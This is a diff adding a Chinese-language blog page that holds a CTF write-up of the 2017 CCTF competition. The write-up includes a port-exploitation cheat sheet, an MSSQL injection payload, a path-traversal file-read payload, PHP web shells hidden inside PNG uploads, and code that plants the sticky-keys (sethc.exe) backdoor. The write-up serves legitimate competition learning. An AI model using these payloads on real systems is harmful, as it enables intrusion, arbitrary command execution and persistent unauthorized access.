@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>CCTF（重庆绿盟杯）比赛writeUp | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/blog/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/blog/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/blog/js/script.js"></script>
+    
+    <script src="/blog/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+
+  <!-- for theme: default is false -->
+  <!-- for page: default is true -->
+
+<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+	
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CCTF（重庆绿盟杯）比赛writeUp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 24, 2017</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/blog/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-23-66.jpg">
+<a id="more"></a></p>
+<h1 id="web1">WEB1</h1>
+<p>靶机只扫描到22的ssh端口 那么思路只有一个，只能爆破</p>
+<p>用的是一个SSH爆破工具<strong>SSH_Crack</strong>
+<strong>百度云下载链接:</strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qX9lyZM">https://pan.baidu.com/s/1qX9lyZM</a>
+然后下几个弱密码字典，放进去跑，然而并没有什么用
+最后到结束也没跑出来，跑到怀疑人生。结束后问别队，他们说最后半小时出现了一个5984的端口</p>
+<blockquote>
+<p>+21 ftp</p>
+<p>+22 SSH</p>
+<p>+23 Telnet</p>
+<p>+80 web</p>
+<p>+80-89 web</p>
+<p>+161 SNMP</p>
+<p>+389 LDAP</p>
+<p>+443 SSL心脏滴血以及一些web漏洞测试</p>
+<p>+445 SMB</p>
+<p>+512,513,514 Rexec</p>
+<p>+873 Rsync未授权</p>
+<p>+1025,111 NFS</p>
+<p>+1433 MSSQL</p>
+<p>+1521 Oracle:(iSqlPlus Port:5560,7778)</p>
+<p>+2082/2083 cpanel主机管理系统登陆 （国外用较多）</p>
+<p>+2222 DA虚拟主机管理系统登陆 （国外用较多）</p>
+<p>+2601,2604 zebra路由，默认密码zebra</p>
+<p>+3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了</p>
+<p>+3306 MySQL</p>
+<p>+3312/3311 kangle主机管理系统登陆</p>
+<p>+3389 远程桌面</p>
+<p>+4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</p>
+<p>+5432 PostgreSQL</p>
+<p>+5900 vnc</p>
+<p>+5984 CouchDB http://xxx:5984/_utils/</p>
+<p>+6082 varnish 参考WooYun: Varnish HTTP accelerator CLI
+未授权访问易导&gt;+致网站被直接篡改或者作为 代理进入内网</p>
+<p>+6379 redis未授权</p>
+<p>+7001,7002 WebLogic默认弱口令，反序列</p>
+<p>+7778 Kloxo主机控制面板登录</p>
+<p>+8000-9090
+都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</p>
+<p>+8080 tomcat/WDCP主机管理系统，默认弱口令</p>
+<p>+8080,8089,9090 JBOSS</p>
+<p>+8083 Vestacp主机管理系统 (国外用较多)</p>
+<p>+8649 ganglia</p>
+<p>+8888 amh/LuManager 主机管理系统默认端口 +9200,9300 elasticsearch
+参考WooYun: 多玩某服务器ElasticSearch命令执&gt;+行漏洞</p>
+<p>+10000 Virtualmin/Webmin 服务器虚拟主机管理系统</p>
+<p>+11211 memcache未授权访问</p>
+<p>+27017,27018 Mongodb未授权访问</p>
+<p>+28017 mongodb统计页面</p>
+<p>+50000 SAP命令执行</p>
+<p>+50070,50030 hadoop默认端口未授权访问</p>
+</blockquote>
+<p><strong>神坑!!!</strong>
+至于5984端口的利用，就在此留个坑吧，有兴趣的可以查一下资料，本菜就不写了
+&gt;毕竟在这题浪费了很多时间，再也不想看到这题，23333</p>
+<h1 id="web2">WEB2</h1>
+<h2 id="mssql注入">MSSQL注入</h2>
+<p>比赛当时我找到的是一个shop7z的一个通用注入pkid
+因为是MSSQL的数据库，不允许limit，故使用order
+by修改表序列，是一个显式union注入 <strong>payload:</strong></p>
+<pre class="http"><code>Union%0a/!5000SelECt/%0a12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8%0aMSysAccessObjects%0aorder%0aby%0a1</code></pre>
+<p>因为是MSSQL,我平时积累不多,且把<code>@@version</code>替换上面数字会出false的页面，就懵逼了
+大早上没吃早餐，被雨淋，还被空调吹得晕乎乎的，就就此放弃琢磨了这一道MSSQL注入，说实话还是积累太少。</p>
+<h1 id="web3">WEB3</h1>
+<h2 id="一阶段上传绕过">一阶段――上传绕过</h2>
+<p><strong>第一步扫描：</strong></p>
+<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-17-21.jpg"></p>
+<p>发现开了很多端口 其中3389和80和8080是我们特别关注的
+进去80是一个IIS的建设中的页面，没啥挖掘的
+8080是一个Apache搭的应用下载市场 AWVS扫描发现有用的目录遍历漏洞</p>
+<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-28.jpg"></p>
+<h5 id="有问题变量在模板参数tpl处">有问题变量在模板参数tpl处</h5>
+<p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code> <img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-21-47.jpg"></p>
+<h3 id="科普">科普</h3>
+<p>还是科普一下 windows/win.ini，可以对照一下你C盘的C:.ini
+是一个系统的配置文件 %00是截断符，../回溯至win.ini后将读取win.ini%00.jpg
+因为windows的读取特性，后缀名.jpg会被截断，将会读取win.ini达到任意文件读取的目的
+然后其他两名队友Jason&amp;&amp;Unk0wn发现有一个图片上传点，但是上传的文件会被改名成静态图像文件，并且上传会过滤PHP等解析格式
+随后我就有一个大胆的想法(其实当时只是想死马当活马医)
+对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php</p>
+<h3 id="尝试">尝试</h3>
+<p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话
+大概是这样子的</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_POST</span>[<span class="dv">1</span>])<span class="ot">;</span><span class="kw">echo</span> <span class="dv">1</span><span class="ot">;</span><span class="kw">?&gt;</span></span></code></pre></div>
+<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-37-40.jpg"></p>
+<p>然后上传之后记录上传路径,将tpl改成静态png的路径。 大概是这样子的</p>
+<p><img src="/blog/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/21-40-49.jpg"></p>
+<p>毕竟环境已经关了，无法有更多详细的截图了，实在抱歉</p>
+<p>随后发现Png被解析成php了，并且提示,<code>system()</code>由于某些安全原因被禁用了</p>
+<p>随后就将一句话构造成这样</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> </span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span><span class="op">=</span><span class="va">$_POST</span>[<span class="dv">2</span>]<span class="ot">;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="va">$a</span><span class="op">.</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="va">$b</span> <span class="op">=</span> <span class="fu">scandir</span>(<span class="va">$a</span><span class="ot">,</span><span class="dv">1</span>)<span class="ot">;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="fu">print_r</span>(<span class="va">$b</span>)<span class="ot">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="fu">phpinfo</span>()<span class="ot">;</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p>同样上传图片，包含新图片路径
+庆幸的是<code>phpinfo()</code>是可以执行的，我们将post数据构造成当前目录路径</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cn">POST_DATA</span><span class="ot">:</span> <span class="dv">2</span><span class="op">=</span><span class="fu">getcwd</span>()<span class="ot">;</span></span></code></pre></div>
+<p>执行后得到当前路径以及当前路径所有文件的名字,具体的路径没截图了，反正是C盘下的路径
+以及当前目录下的flag_i4_H37e.txt文件
+利用上面显示win.ini的方法，包含flag_i4_H37e.txt即可得到传马所得flag200分
+## 分析
+因为比赛是有三层靶机，而二层靶机是无法ping通的，所以应该是通过控制WEB3的主机,然后开启ip转发，使得我们能够继续渗透二层靶机。故我们接下来的思路是控制WEB3所在靶机</p>
+<h2 id="比赛宕机">比赛宕机</h2>
+<h6 id="发生了两次宕机其中有一次长达半个多小时比赛才6个小时欲哭无泪">发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪</h6>
+<h2 id="比赛继续">比赛继续</h2>
+<p>通过phpinfo可以知道disable_functions=proc_open,passthru,exec,system,shell_exec,,popen
+这些函数都被禁用了</p>
+<blockquote>
+<p>proc_open() -
+功能描述：执行一个命令并打开文件指针用于读取以及写入。</p>
+<p>passthru() - 功能描述：允许执行一个外部程序并回显输出，类似于
+exec()。</p>
+<p>exec() - 功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD
+命令等）。</p>
+<p>system() - 功能描述：允许执行一个外部程序并回显输出，类似于
+passthru()。</p>
+<p>shell_exec() -功能描述：通过 Shell
+执行命令，并将执行结果作为字符串返回。</p>
+<p>popen() - 功能描述：可通过 popen() 的参数传递一条命令，并对 popen()
+所打开的文件进行执行。</p>
+</blockquote>
+<p>那就十分尴尬了 我们能解析php但是并不能执行系统函数</p>
+<h2 id="端口">3389 端口</h2>
+<p>由于WEB3是开了3389端口，而且我们又能执行php的大部分代码，故我又产生了一个大胆的想法</p>
+<h3 id="经典后门粘滞键后门">经典后门――粘滞键后门</h3>
+<ol type="1">
+<li>通过php的copy()函数将C:.exe替换成cmd.exe</li>
+<li>3389端口远程连接WEB3的靶机</li>
+<li>狂按shift键，召唤出被替换成cmd.exe的程序sethc.exe</li>
+</ol>
+<p>于是将一句换木马插入PNG图片的中间：</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">unlink</span>(<span class="st">&quot;C:</span><span class="sc">\\</span><span class="st">Windows</span><span class="sc">\\</span><span class="st">system32</span><span class="sc">\\</span><span class="st">sethc.exe&quot;</span>)<span class="ot">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="fu">copy</span>(<span class="st">&quot;C:</span><span class="sc">\\</span><span class="st">Windows</span><span class="sc">\\</span><span class="st">system32</span><span class="sc">\\</span><span class="st">cmd.exe&quot;</span><span class="ot">,</span><span class="st">&quot;C:</span><span class="sc">\\</span><span class="st">Windows</span><span class="sc">\\</span><span class="st">system32</span><span class="sc">\\</span><span class="st">sethc.exe&quot;</span>)<span class="ot">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<p>同样的，上传图片木马，包含路径-&gt;解析，然后3389连接WEB3靶机，狂按shift键</p>
+<p>于是很惊喜地发现，cmd.exe被我们召唤出来了</p>
+<p><strong><em>此处图没有机会没保留</em></strong></p>
+<p>于是输入explorer.exe，回车，召唤出桌面来
+DOS权限还是administrator的</p>
+<p>通过浏览目录发现了桌面下的flag.txt，拿到了最后200分
+由于本菜太愚钝，最后面几分钟才拿到这200分,<strong>真刺激</strong></p>
+<p>其实我们在构造shift之前我们已经能控制目录，浏览目录，直接找到桌面下的flag.txt了
+但是要进入第二层靶机必须要控制WEB3的靶机 故这一步还是十分关键的
+虽然后面没有时间用WEB3靶机代理继续渗透二层靶机(比赛完听大佬说二层靶机是wordpress的最近版还是挺难的)，也不算太遗憾吧</p>
+<h2 id="至此比赛结束">至此比赛结束</h2>
+<h3 id="总结">总结</h3>
+<p>有以下几点： - 以后打比赛一定要吃早餐 - 一定不能淋雨吹空调 -
+以及还是太菜，继续努力吧</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://testzero-wz.github.io/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/">https://testzero-wz.github.io/2017/09/24/CCTF-%E9%87%8D%E5%BA%86%E7%BB%BF%E7%9B%9F%E6%9D%AF-%E6%AF%94%E8%B5%9BwriteUp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/blog/tag/CTF/"># CTF</a>
+                    
+                        <a href="/blog/tag/WriteUp/"># WriteUp</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/blog/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/blog/2017/09/27/NSCTF-Web-WriteUp/">NSCTF-Web-WriteUp</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+    </div>
+</body>
+</html>
